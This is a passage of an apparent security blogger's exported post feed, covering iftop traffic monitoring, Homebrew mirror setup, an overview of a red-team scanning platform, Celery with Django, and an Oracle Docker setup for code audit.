src="https://img-blog.csdnimg.cn/img_convert/a6215dbf9f1e55d4bbef83f7860c37bb.png" alt="image-20210825160452205"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目-导入项目</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/12092ba14d342cd31c5ffb932f9d1cc8.png" alt="image-20210831090412636"></p><p>点击编译就可以运行，后续就可以自己调试</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d965ed46cc1ec8892d4485a6926566ce.png" alt="image-20210825164654699"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/afed3a69be55b153af81088a97a8f14f.png" alt="image-20210825163839953"></p><h1 id="0x05-解决方法："><a href="#0x05-解决方法：" class="headerlink" title="0x05 解决方法："></a>0x05 解决方法：</h1><p>在微信社区寻求答案，发现选择最好的方式都是选择云函数的方法，避免把密钥写到前端程序中</p><p><img src="https://img-blog.csdnimg.cn/img_convert/decc982f4420017ff5cd150b09e81b8d.png" alt="image-20210825133749060"></p>]]></content>
      
      
      <categories>
          
          <category> app渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用iftop 流量监控 速率监控</title>
      <link href="/2021/08/05/%E4%BD%BF%E7%94%A8iftop%20%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7%20%E9%80%9F%E7%8E%87%E7%9B%91%E6%8E%A7/"/>
      <url>/2021/08/05/%E4%BD%BF%E7%94%A8iftop%20%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7%20%E9%80%9F%E7%8E%87%E7%9B%91%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-使用iftop-流量监控-速率监控"><a href="#0x00-使用iftop-流量监控-速率监控" class="headerlink" title="0x00 使用iftop 流量监控 速率监控"></a>0x00 使用iftop 流量监控 速率监控</h1><p>使用iftop对流量监控，对总的发送速率进行监控</p><h2 id="0x01-mac-安装-iftop"><a href="#0x01-mac-安装-iftop" class="headerlink" title="0x01 mac 安装 iftop"></a>0x01 mac 安装 iftop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew reinstall iftop</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/79c6ab8c9932b6b235a0b50b6f706109.png" alt="image-20210805170301218"></p><p>注：如果出现403的报错，下载直接失败的情况，建议换homebrew的源，再进行安装</p><p>参考 <a href="https://blog.csdn.net/god\_zzZ/article/details/119422419" target="_blank" rel="noopener">https://blog.csdn.net/god\_zzZ/article/details/119422419</a></p><h3 id="加入软连接"><a href="#加入软连接" class="headerlink" title="加入软连接"></a>加入软连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;iftop&#x2F;1.0pre4&#x2F;sbin&#x2F;iftop &#x2F;usr&#x2F;local&#x2F;bin&#x2F;iftop</span><br></pre></td></tr></table></figure><p>查看帮助，安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iftop -h</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/a8a633e76fb2cefc4a52f27456125e05.png" alt="image-20210805170823168"></p><h1 id="0x02-简单使用"><a href="#0x02-简单使用" class="headerlink" title="0x02 简单使用"></a>0x02 简单使用</h1><p>监控 en0 网卡的流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iftop -i en0</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/3902211052bb7678a82126b6d308228f.png" alt="image-20210805171158054"></p><p>其他选项设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-i设定监测的网卡，如：# iftop -i eth1</span><br><span class="line"></span><br><span class="line">-B 以bytes为单位显示流量(默认是bits)，如：# iftop -B</span><br><span class="line"></span><br><span class="line">-n使host信息默认直接都显示IP，如：# iftop -n</span><br><span class="line"></span><br><span class="line">-N使端口信息默认直接都显示端口号，如: # iftop -N</span><br><span class="line"></span><br><span class="line">-F显示特定网段的进出流量，如# iftop -F 10.10.1.0&#x2F;24或# iftop -F 10.10.1.0&#x2F;255.255.255.0</span><br><span class="line"></span><br><span class="line">-h（display this message），帮助，显示参数信息</span><br><span class="line"></span><br><span class="line">-p使用这个参数后，中间的列表显示的本地主机信息，出现了本机以外的IP信息;</span><br><span class="line"></span><br><span class="line">-b使流量图形条默认就显示;</span><br><span class="line"></span><br><span class="line">-f这个暂时还不太会用，过滤计算包用的;</span><br><span class="line"></span><br><span class="line">-P使host信息及端口信息默认就都显示;</span><br><span class="line"></span><br><span class="line">-m设置界面最上边的刻度的最大值，刻度分五个大段显示，例：# iftop -m 100M</span><br></pre></td></tr></table></figure><h1 id="0x03-shell-脚本"><a href="#0x03-shell-脚本" class="headerlink" title="0x03 shell 脚本"></a>0x03 shell 脚本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iftop -i en0 -P -n -t -L 1 -s 1 -B|grep &quot;Total send rate:&quot;|awk &#39;&#123;print $4&#125;&#39; &gt;&gt; &#x2F;Users&#x2F;zy&#x2F;Desktop&#x2F;2222.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|grep &quot;Total send rate:&quot;   筛选最后速率一行的全部</span><br><span class="line">｜ awk &#39;&#123;print $4&#125;&#39;  输出第几个位置的</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/8c18e6adb86bd49a99d77720587e0f65.png" alt="image-20210805180121393"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MAC Brew 国内 换源</title>
      <link href="/2021/08/05/MAC%20Brew%20%E5%9B%BD%E5%86%85%20%E6%8D%A2%E6%BA%90/"/>
      <url>/2021/08/05/MAC%20Brew%20%E5%9B%BD%E5%86%85%20%E6%8D%A2%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="mac-Brew-国内-换源"><a href="#mac-Brew-国内-换源" class="headerlink" title="mac Brew 国内 换源"></a>mac Brew 国内 换源</h1><p><em>Brew源</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span></span><br><span class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/brew.git</span><br></pre></td></tr></table></figure><p>软件源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core"</span></span><br><span class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span>/Library/Taps/homebrew/homebrew-cask</span><br><span class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br></pre></td></tr></table></figure><p><em>Bottles源</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于红队武器库项目介绍</title>
      <link href="/2021/07/12/%E5%85%B3%E4%BA%8E%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D/"/>
      <url>/2021/07/12/%E5%85%B3%E4%BA%8E%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-武器库"><a href="#0x00-武器库" class="headerlink" title="0x00 武器库"></a>0x00 武器库</h1><p>前后端分离项目：<a href="https://github.com/godzeo/ArsenalWeb" target="_blank" rel="noopener">https://github.com/godzeo/ArsenalWeb</a></p><p>本项目是一个红队武器库平台，包含常用的一些红队功能，也会集合一些其他好用的工具到里面</p><blockquote><p>正在开发中…</p></blockquote><p>暂时不全部开源，因为还有很多bug和代码质量有点烂…</p><blockquote><p>开发</p></blockquote><p>前后端分离项目：</p><p>后端：采用django+django-rest-framework,</p><p>前端采用vue+ElementUI</p><p>JWT认证,支持swagger</p><blockquote><p>必要环境</p></blockquote><p>Redis+npm+Python3.7</p><h1 id="0x02-组件（功能）"><a href="#0x02-组件（功能）" class="headerlink" title="0x02 组件（功能）"></a>0x02 组件（功能）</h1><ul><li>红队最新漏洞共享 （markdown格式）</li><li>企业信息收集（前端界面简陋，数据源：企查查）</li><li>单个网站漏洞扫描</li><li>漏洞扫描 （大规模资产漏扫扫描）</li><li>其他系统功能</li></ul><p>TODO</p><ul><li>缺少一个数据清洗</li></ul><p>大规模资产漏扫扫描流程：</p><ul><li><p>根域名收集 （可借助企业信息收集模块）</p></li><li><p>子域名收集</p></li><li><p>被动信息收集（fofa，sodan）</p></li><li><p>IP地址解析</p></li><li><p>端口指纹扫描 （web-top 20）</p></li><li><p>WEB服务探测</p></li><li><p>waf检测</p></li><li><p>重要应用指纹识别（指纹识别模块）</p></li><li><p>自建POC扫描（想兼容最新发现goby的poc格式-未完成）</p></li><li><p>漏洞扫描引擎（仅有第三方）</p></li></ul><p>​</p><p>注：过程要尽量减少bug，否则就会是指数级的任务爆炸</p><h1 id="0x03-已完成展示"><a href="#0x03-已完成展示" class="headerlink" title="0x03 已完成展示"></a>0x03 已完成展示</h1><p>登陆</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ead0dc56257e0d0c487d6191292cd4f7.png" alt="image-20210507181700790"></p><h3 id="主菜单"><a href="#主菜单" class="headerlink" title="主菜单"></a>主菜单</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/3329724616c3e28f454e7bdcf23af81e.png" alt="image-20210712121348583"></p><h3 id="企业信息收集模块"><a href="#企业信息收集模块" class="headerlink" title="企业信息收集模块"></a>企业信息收集模块</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/8a6316da3be34ef13df3716be814225c.png" alt="image-20210712155401571"></p><p>excl数据：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/861f7b08bfad29f8e592d8f076eb2f45.png" alt="image-20210712155432687"></p><h3 id="漏洞分享"><a href="#漏洞分享" class="headerlink" title="漏洞分享"></a>漏洞分享</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/f642277df28105178826082c0cdfb8fb.png" alt="image-20210712155932031"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/72424d2896001b0ff5e43c8519386f89.png" alt="image-20210712160330176"></p><h3 id="漏洞扫描主域名模块"><a href="#漏洞扫描主域名模块" class="headerlink" title="漏洞扫描主域名模块"></a>漏洞扫描主域名模块</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/8189fe3d09421ddeb1929e09bbc0233b.png" alt="image-20210622101727981"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/3289063f7a4bfb8ffd5760604e9d1e49.png" alt="image-20210622101946573"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b2d82998f35b172f7cee84bf8c00b348.png" alt="image-20210710180245244"></p><h3 id="漏洞扫描子域名模块"><a href="#漏洞扫描子域名模块" class="headerlink" title="漏洞扫描子域名模块"></a>漏洞扫描子域名模块</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/bc293a30d4ce1248f4cd899b21dad4df.png" alt="image-20210622101810164"></p><h3 id="全部漏洞信息"><a href="#全部漏洞信息" class="headerlink" title="全部漏洞信息"></a>全部漏洞信息</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/c6155db5cd449523d6f875136cd811ca.png" alt="image-20210622101856129"></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/474df0e440239414b1597079ebef1b2c.png" alt="image-20210712155639774"></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Celery在DJANGO中的简单使用</title>
      <link href="/2021/06/23/Celery%E5%9C%A8DJANGO%E4%B8%AD%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/06/23/Celery%E5%9C%A8DJANGO%E4%B8%AD%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Celery-简介"><a href="#Celery-简介" class="headerlink" title="Celery 简介"></a>Celery 简介</h1><p>​ 除了redis，还可以使用另外一个神器—Celery。Celery是一个异步任务的调度工具。</p><p>​ Celery 是 Distributed Task Queue，分布式任务队列，分布式决定了可以有多个 worker 的存在，队列表示其是异步操作，即存在一个产生任务提出需求的工头，和一群等着被分配工作的码农。</p><p>​ 在 Python 中定义 Celery 的时候，我们要引入 Broker，中文翻译过来就是“中间人”的意思，在这里 Broker 起到一个中间人的角色。在工头提出任务的时候，把所有的任务放到 Broker 里面，在 Broker 的另外一头，一群码农等着取出一个个任务准备着手做。</p><p>​ 这种模式注定了整个系统会是个开环系统，工头对于码农们把任务做的怎样是不知情的。所以我们要引入 Backend 来保存每次任务的结果。这个 Backend 有点像我们的 Broker，也是存储任务的信息用的，只不过这里存的是那些任务的返回结果。我们可以选择只让错误执行的任务返回结果到 Backend，这样我们取回结果，便可以知道有多少任务执行失败了。</p><p>​ Celery(芹菜)是一个异步任务队列/基于分布式消息传递的作业队列。它侧重于实时操作，但对调度支持也很好。Celery用于生产系统每天处理数以百万计的任务。Celery是用Python编写的，但该协议可以在任何语言实现。它也可以与其他语言通过webhooks实现。Celery建议的消息队列是RabbitMQ，但提供有限支持Redis, Beanstalk, MongoDB, CouchDB, 和数据库（使用SQLAlchemy的或Django的 ORM） 。Celery是易于集成Django, Pylons and Flask，使用 django-celery, celery-pylons and Flask-Celery 附加包即可。</p><p><strong>Celery 官网：<a href="http://www.celeryproject.org/" target="_blank" rel="noopener">http://www.celeryproject.org/</a></strong></p><p><strong>Celery 官方文档英文版</strong>：<a href="http://docs.celeryproject.org/en/latest/index.html" target="_blank" rel="noopener"><strong>http://docs.celeryproject.org/en/latest/index.html</strong></a></p><p><strong>Celery 官方文档中文版：<a href="http://docs.jinkan.org/docs/celery/" target="_blank" rel="noopener">http://docs.jinkan.org/docs/celery/</a></strong></p><p>项目目录</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fdc2e97ade8efb5775ea905234934c2a.png" alt="image-20210623184033611"></p><p>Config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author   : Zeo</span></span><br><span class="line"><span class="string">@software : PyCharm2021</span></span><br><span class="line"><span class="string">@docs     : https://docs.celeryproject.org/en/stable/userguide/configuration.html</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">broker_url = <span class="string">'redis://127.0.0.1:6379/2'</span>  <span class="comment"># 消息中间件配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#result_backend = 'redis://127.0.0.1:6379/16'  # 默认不开启,后端用于存储任务结果（逻辑删除）</span></span><br></pre></td></tr></table></figure><p>Main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author   : Zeo</span></span><br><span class="line"><span class="string">@software : PyCharm2021</span></span><br><span class="line"><span class="string">@docs     : https://docs.celeryproject.org/en/stable/</span></span><br><span class="line"><span class="string">            https://github.com/celery/celery</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为celery程序设置Django配置</span></span><br><span class="line">os.environ.setdefault(<span class="string">'DJANGO_SETTINGS_MODULE'</span>, <span class="string">'drf_admin.settings.dev'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建celery应用 app = Celery('admin')</span></span><br><span class="line">app = Celery(<span class="string">'scan'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入celery配置</span></span><br><span class="line">app.config_from_object(<span class="string">'celery_tasks.config'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载celery任务模块</span></span><br><span class="line">app.autodiscover_tasks([<span class="string">'celery_tasks.sms'</span>, <span class="string">'drf_admin.apps.vulscan'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Celery命令, (修改celery任务后必须重启celery)</span></span><br><span class="line"><span class="comment"># celery -A celery_tasks.main  worker --loglevel=info</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># win系统(celery4.0版本后不支持win, 需安装eventlet模块启动celery)</span></span><br><span class="line"><span class="comment"># celery -A celery_tasks.main  worker --loglevel=info -P eventlet</span></span><br></pre></td></tr></table></figure><p>建立task.py文件(里面是异步的主程序)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># author: Zeo</span></span><br><span class="line"><span class="comment"># python: 3.7 </span></span><br><span class="line"><span class="comment"># datetime:2021/6/15 11:28 上午</span></span><br><span class="line"><span class="comment"># software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">文件说明：celery异步测试</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> celery_tasks.main <span class="keyword">import</span> app</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task(name='celerytest1')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">celerytest1</span><span class="params">(id)</span>:</span></span><br><span class="line">    print(<span class="string">"celery_tasks"</span>+str(id))</span><br></pre></td></tr></table></figure><p>注意每次增加任务，要注册任务模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Main.py</span><br><span class="line"># 加载celery任务模块</span><br><span class="line">app.autodiscover_tasks([&#39;celery_tasks.sms&#39;, &#39;drf_admin.apps.vulscan&#39;])</span><br></pre></td></tr></table></figure><p>调用异步任务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@action(methods=['post'], detail=False)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    data=request.data</span><br><span class="line">    id = request.data.get(<span class="string">'id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#celerytest1 异步任务，调用delay。（id）是传参</span></span><br><span class="line">    celerytest1.delay(id)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(content=<span class="string">'one_scan'</span>, content_type=<span class="literal">None</span>, status=<span class="number">200</span>)</span><br></pre></td></tr></table></figure><h1 id="命令行启动"><a href="#命令行启动" class="headerlink" title="命令行启动"></a>命令行启动</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A celery_tasks.main  worker --loglevel=info</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker快速搭建Oracle服务，导入dmp文件</title>
      <link href="/2021/03/05/Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAOracle%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%AF%BC%E5%85%A5dmp%E6%96%87%E4%BB%B6/"/>
      <url>/2021/03/05/Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAOracle%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%AF%BC%E5%85%A5dmp%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Docker快速搭建Oracle服务，导入dmp文件"><a href="#Docker快速搭建Oracle服务，导入dmp文件" class="headerlink" title="Docker快速搭建Oracle服务，导入dmp文件"></a>Docker快速搭建Oracle服务，导入dmp文件</h1><p>代码审计遇到oracle数据库,记录一下如何快速的搭建，然后导入dmp数据库备份文件</p><h2 id="0x01-前置环境"><a href="#0x01-前置环境" class="headerlink" title="0x01 前置环境"></a>0x01 前置环境</h2><ol><li>macos</li><li>Docker</li></ol><h2 id="0x02-搭建Oracle服务"><a href="#0x02-搭建Oracle服务" class="headerlink" title="0x02 搭建Oracle服务"></a>0x02 搭建Oracle服务</h2><p>1、拉取Oracle镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com&#x2F;helowin&#x2F;oracle_11g</span><br></pre></td></tr></table></figure><p>2、运行镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 1521:1521 --name oracle_11g --restart&#x3D;always -v &#x2F;Users&#x2F;zy&#x2F;Desktop&#x2F;logs:&#x2F;home&#x2F;oracle&#x2F;app&#x2F;oracle&#x2F;oradata&#x2F;mydata registry.cn-hangzhou.aliyuncs.com&#x2F;helowin&#x2F;oracle_11g</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-v &#x2F;Users&#x2F;zy&#x2F;Desktop&#x2F;logs:&#x2F;home&#x2F;oracle&#x2F;app&#x2F;oracle&#x2F;oradata&#x2F;mydata</span><br><span class="line"></span><br><span class="line">前面&#x2F;Users&#x2F;zy&#x2F;Desktop&#x2F;logs   是物理机器的路径</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;oracle&#x2F;app&#x2F;oracle&#x2F;oradata&#x2F;mydata  是docker里面的路径</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/287a1c01249c2d35765ffb0ba235ce8c.png" alt="image-20210304164235951"></p><p>3、进入容器设置用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it oracle_11g bash</span><br></pre></td></tr></table></figure><p>4、切换root用户，密码：helowin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[oracle@8a494f051f36 &#x2F;]$ su</span><br><span class="line">Password:</span><br><span class="line">[root@8a494f051f36 &#x2F;]#</span><br></pre></td></tr></table></figure><p>5、配置oracle环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>在末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ORACLE_HOME&#x3D;&#x2F;home&#x2F;oracle&#x2F;app&#x2F;oracle&#x2F;product&#x2F;11.2.0&#x2F;dbhome_2 </span><br><span class="line">export ORACLE_SID&#x3D;helowin </span><br><span class="line">export PATH&#x3D;$ORACLE_HOME&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure><p>刷新配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>创建建立sqlplus软连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s $ORACLE_HOME&#x2F;bin&#x2F;sqlplus &#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure><p>切换到oracle用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@8a494f051f36 &#x2F;]# exit</span><br><span class="line">exit</span><br><span class="line">[oracle@8a494f051f36 &#x2F;]$</span><br></pre></td></tr></table></figure><p>刷新配置(如果找不到命令，就多刷新配置)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>登录sqlplus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlplus &#x2F; as sysdba</span><br></pre></td></tr></table></figure><p>修改sys和system用户密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter user system identified by 123456;</span><br><span class="line">alter user sys identified by 123456;</span><br><span class="line">ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;</span><br></pre></td></tr></table></figure><p>连接配置</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e070d5b5c7f433056714af8bc2c96626.png" alt="image-20210304165951371"></p><p>//创建用户、用户授权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;创建用户</span><br><span class="line">create user test identified by 123456;</span><br><span class="line">&#x2F;&#x2F;用户授权</span><br><span class="line">grant connect, resource,dba to test;</span><br></pre></td></tr></table></figure><p>登陆测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[oracle@8a494f051f36 &#x2F;]$ sqlplus</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 11.2.0.1.0 Production on Thu Mar 4 17:03:17 2021</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2009, Oracle.  All rights reserved.</span><br><span class="line"></span><br><span class="line">Enter user-name: test</span><br><span class="line">Enter password:</span><br><span 